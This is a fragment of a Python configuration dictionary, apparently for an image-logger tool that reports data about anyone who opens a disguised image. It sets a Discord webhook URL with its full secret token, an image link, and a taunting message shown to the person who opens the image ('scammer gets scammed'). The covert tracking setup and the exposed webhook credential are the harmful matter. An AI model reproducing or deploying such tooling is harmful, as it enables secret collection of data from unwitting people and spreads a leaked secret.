...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1229018482121769080/BnZdv9s-JuIs1uVghLUkODrhxM25r02i8QehYYyevinORzrW7jgR1WQLGWA79EytKgnD",
    "image": "https://i.imgur.com/kXQuXwS.png", # You can also have a custom image by using a URL argument
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "3,2,1 aaaand scammer gets scammed buddy haha", # Message to show
